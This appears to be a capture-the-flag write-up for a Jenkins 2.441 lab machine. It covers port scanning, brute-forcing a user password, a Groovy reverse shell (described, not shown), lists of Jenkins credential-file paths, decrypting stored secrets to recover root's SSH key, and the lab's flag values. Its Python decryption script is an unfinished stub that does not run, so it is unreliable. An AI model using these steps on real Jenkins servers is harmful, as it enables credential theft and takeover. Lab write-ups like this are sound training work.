# 10.10.11.10

## Nmap scans
```
nmap 10.10.11.10
Starting Nmap 7.93 ( https://nmap.org ) at 2025-10-13 17:45 EDT
Nmap scan report for 10.10.11.10
Host is up (0.037s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
8080/tcp open  http-proxy
```

```

```

## Foothold
- Manually parsing the website
- Running `Jenkins 2.441`
- should have a user `jennifer`
- credentials/store contains the `root` ssh key apparently

#### Trying a password attack using Intruder on `jennifer`
- used xato-100million-10000 password list
- `jennifer`:`princess`

#### Getting a shell and flag
- run the groovy script for a reverse shell on our nc listener
- we get a reverse shell as the user `jenkins`
- `/var/jenkins_` directory contains the user.txt flag - `67661da816315fa3ccdb3a9e68631e07`

## PrivEsc

- common jenkins credentials storage sites:
```
/var/lib/jenkins/credentials.xml
/var/jenkins_home/credentials.xml
$JENKINS_HOME/credentials.xml
/var/lib/jenkins/users/[username]/config.xml
```
- the `credentials.xml` file contains a secret key.
    - seems to be the ssh private key for root which we saw in the jenkins app.
    - ![alt text](image.png)
- We will try to create the id_rsa from the private key that we see:
    - the private key looks like `AQAAABAAAAowLrfCrZx9baW`
    - `echo "AQAAABAAAAowLrfCrZx9baW<SNIP>" | fold -w 64 > key_body.txt`
    - `echo "-----BEGIN RSA PRIVATE KEY-----" > id_rsa`
    - `cat key_body.txt >> id_rsa`
    - `echo "-----END RSA PRIVATE KEY-----" >> id_rsa`
    - make sure to add a new-line at the end
    - `chmod 600 id_rsa`
    - `ssh -i id_rsa root@10.10.11.10`
    - this fails with an `invalid key or libcrypto` error

- going through the files again
- it also contains a secret.key - `bc6870aa3d0476290e43823cae66812773cc5364caa990c8157074b4c020fb5b`
- there is a `secret` folder with `Hudson.util.Secret` file and a `master.key`
- on more [RND](https://medium.com/@AndrzejRehmann/accessing-and-dumping-jenkins-credentials-90945d7b93b), it was discovered that the stored creds in `credentials.xml` either contain `---BEGIN RSA` if not encrypted or start with `{AQAAA...}` if encrypted.
- In our case, they are encrypted.
- To decrypt, we can do:
1. If we have access to the script console:
`println(hudson.util.Secret.decrypt("{AQAAABAAAAowLrfCrZx9baW"}))`
- this will print out the decrypted key which we can use after adding the newline and chmod.

2. Copy files to KALI
```
# Essential files for offline decryption
/var/lib/jenkins/secrets/master.key
/var/lib/jenkins/secrets/hudson.util.Secret
/var/lib/jenkins/credentials.xml

# Optional but useful
/var/lib/jenkins/config.xml
/var/lib/jenkins/users/*/config.xml
```
- use `jenkins-decrypt`
```
# Clone tool
git clone https://github.com/hoto/jenkins-decrypt
cd jenkins-decrypt

# Decrypt
python3 decrypt.py master.key hudson.util.Secret credentials.xml
```

3. Manually
`Install dependencies - pip3 install pycryptodome`
- create script
```
#!/usr/bin/env python3
from Crypto.Cipher import AES
import base64
import hashlib

def decrypt_jenkins_secret(master_key, hudson_secret, encrypted_text):
    # Remove {AQAAAB...} wrapper
    encrypted_text = encrypted_text.strip('{}')
    
    # Decode base64
    encrypted_bytes = base64.b64decode(encrypted_text)
    
    # Jenkins uses first 16 bytes as IV
    magic = encrypted_bytes[:2]
    iv = encrypted_bytes[2:18]
    encrypted_data = encrypted_bytes[18:]
    
    # Derive key from master.key and hudson.util.Secret
    # [Complex crypto - use existing tools]
    
    cipher = AES.new(key, AES.MODE_CBC, iv)
    decrypted = cipher.decrypt(encrypted_data)
    
    return decrypted

# Usage
master_key = open('master.key', 'rb').read()
hudson_secret = open('hudson.util.Secret', 'rb').read()
encrypted = "{AQAAABAAAAAwYour_encrypted_data}"

print(decrypt_jenkins_secret(master_key, hudson_secret, encrypted))
```
- Use script - `python3 jenkins_decrypt.py`

- `ssh -i id_rsa root@10.10.11.10`
    - get root flag - `1313c0c2fe67152e80d353b6e1142f2a`
